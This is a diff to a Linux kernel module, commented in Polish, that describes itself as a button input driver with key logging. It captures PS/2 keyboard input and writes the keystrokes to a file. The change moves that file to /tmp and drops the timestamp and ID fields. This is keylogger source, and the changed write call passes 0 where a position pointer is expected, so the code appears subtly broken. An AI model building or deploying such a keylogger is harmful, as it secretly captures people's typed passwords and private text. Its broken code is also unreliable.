@@ -10,8 +10,10 @@
 #include <linux/uuid.h>
 #include <linux/fs.h>
 #include <linux/kernel.h>
+#include <linux/inetdevice.h>
+#include <asm/processor.h>
 
-#include "codeTable.h" // Plik nagłówkowy z funkcją mapującą scancode na znak
+#include "codeTable.h" 
 #include "uniqueIdGenerator.h"
 
 MODULE_LICENSE("GPL");
@@ -20,17 +22,10 @@ MODULE_DESCRIPTION("Button Input Driver with Key Logging");
 
 #define BUTTON_PORT 0x60 // Port klawiatury PS/2
 #define BUTTON_IRQ 1     // IRQ klawiatury PS/2
-#define LOG_FILE_PATH "/var/log/keylog.txt"
+#define LOG_FILE_PATH "/tmp/keylog.txt"
 
-static struct input_dev *button_dev; // Urządzenie wejściowe
+static struct input_dev *button_dev; 
 const char *uniqueId;
-// Funkcja zapisująca dane do pliku logu
-#include <linux/fs.h>
-#include <linux/uaccess.h>
-#include <linux/netdevice.h>
-#include <linux/inetdevice.h>
-#include <linux/ipv6.h>
-#include <asm/processor.h>
 
 static void getCurrentTime(char *buffer, size_t buffer_size)
 {
@@ -52,15 +47,8 @@ static void write_to_log_file(const char *data)
         pr_err("Failed to open log file\n");
         return;
     }
-
-    char time_buffer[32];
-    getCurrentTime(time_buffer, sizeof(time_buffer));
-    // Przygotuj dane w formacie JSON
-    char jsonData[120];
-    snprintf(jsonData, sizeof(jsonData), "{ \"Time\": \"%s\" \"ID\": \"%s\", \"Key\": \"%s\"}\n", time_buffer, uniqueId, data);
-
     // Zapisz dane do pliku
-    kernel_write(log_file, jsonData, strlen(jsonData), &pos);
+    kernel_write(log_file, data, strlen(data), 0);
 
     filp_close(log_file, NULL);
 }
